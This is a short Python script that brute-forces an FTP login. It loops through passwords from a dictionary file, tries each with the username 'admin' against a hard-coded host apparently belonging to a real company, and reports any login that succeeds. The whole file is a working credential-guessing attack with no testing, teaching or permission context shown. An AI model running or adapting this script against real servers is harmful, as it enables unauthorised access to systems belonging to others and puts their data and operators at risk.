import ftplib
import sys

def bruteftp(passw):
    try:
        target="ftp.boomi.com"
        ftp=ftplib.FTP(target)
        user='admin'
        password=passw.strip('\r').strip('\n')
        print('Trying with: '+user+" "+password)
        ftp.login(user,password)
        ftp.quit()
        print('Login succeeded with: '+user+" "+password)
        return(user,passw)
    except Exception as e:
        print("Incorrect credentials.")
        return(None,None)

def driver_code():
    dict_file = open('dict.txt','r')
    for line in dict_file.readlines():
        bruteftp(line)

driver_code()
